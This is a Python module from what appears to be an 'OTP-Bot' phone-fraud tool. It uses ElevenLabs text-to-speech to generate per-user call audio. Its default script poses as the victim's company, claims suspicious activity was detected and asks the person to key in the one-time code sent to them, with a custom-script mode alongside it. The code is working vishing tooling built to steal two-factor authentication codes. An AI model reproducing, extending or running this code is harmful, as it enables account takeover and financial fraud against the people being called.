import logging
from pathlib import Path
from typing import Optional

from config import DEFAULT_VOICE_ID, DEFAULT_VOICE_KEY, ELEVENLABS_API_KEY, NGROK_URL
from core.files import ensure_user_path, user_conf_path, read_user_file

logger = logging.getLogger("OTP-Bot.tts_service")


def _load_bot_voice_mapping() -> dict:
    try:
        from bot import VOICE_MAPPING as BOT_VOICE_MAPPING  # type: ignore
        if BOT_VOICE_MAPPING and isinstance(BOT_VOICE_MAPPING, dict):
            return BOT_VOICE_MAPPING
    except Exception:
        return {}
    return {}


def get_voice_mapping() -> dict:
    bot_mapping = _load_bot_voice_mapping()
    if bot_mapping:
        return bot_mapping
    if DEFAULT_VOICE_ID:
        return {DEFAULT_VOICE_KEY or "default": {"id": DEFAULT_VOICE_ID, "name": "Default Voice"}}
    return {}


def get_default_voice_id() -> str:
    """Return a sane default voice id used across the project."""
    try:
        default_voice = get_voice_mapping().get("1", {}).get("id")
        if default_voice:
            return default_voice
        for voice in get_voice_mapping().values():
            if voice.get("id"):
                return voice["id"]
    except Exception:
        pass
    return get_voice_mapping().get("1", {}).get("id", "")

def generate_ai(
    user_id: str,
    text: str,
    page_name: str,
    voice_id: Optional[str] = None,
    emotion: Optional[str] = None,
) -> bool:
    try:
        from elevenlabs.client import ElevenLabs

        if not ELEVENLABS_API_KEY:
            logger.error("ElevenLabs API key not configured")
            return False

        if not voice_id:
            voice_id = read_user_file(user_id, "Voice.txt", get_default_voice_id())

        ensure_user_path(user_id)
        output_path = user_conf_path(user_id) / f"{page_name}.mp3"

        client = ElevenLabs(api_key=ELEVENLABS_API_KEY)
        gen = client.text_to_speech.convert(
            voice_id=voice_id,
            model_id="eleven_flash_v2_5",
            text=text,
            output_format="mp3_44100_128",
        )

        with open(output_path, "wb") as f:
            for chunk in gen:
                if chunk:
                    f.write(chunk)

        logger.info(f"Generated audio for user {user_id}: {page_name}.mp3")
        return True

    except Exception as e:
        logger.error(f"Failed to generate audio: {type(e).__name__}: {e}")
        return False


def prepare_call_audio(
    user_id: str,
    mode: str = "normal",
    emotion: str = "neutral",
    voice_id: Optional[str] = None,
) -> None:
    ensure_user_path(user_id)
    if not voice_id:
        voice_id = read_user_file(user_id, "Voice.txt", get_default_voice_id())

    if mode == "normal":
        name = read_user_file(user_id, "Name.txt", "Customer")
        company = read_user_file(user_id, "Company Name.txt", "your company")
        digits = read_user_file(user_id, "Digits.txt", "6")

        texts = {
            "checkifhuman": f"Hello, I am calling from {company}. Please press 1 to confirm you are {name}.",
            "explain": f"Thank you for confirming, {name}. We have detected suspicious activity and need to verify some details.",
            "askdigits": f"Please enter the {digits} digit code sent to you using your keypad.",
        }

        for page, text in texts.items():
            generate_ai(user_id, text, page, voice_id, emotion)

    elif mode == "custom":
        script = read_user_file(user_id, "custom_script.txt", "")
        if script:
            generate_ai(user_id, script, "custom_script", voice_id, emotion)

    logger.info(f"Audio preparation complete for user {user_id} (mode={mode})")
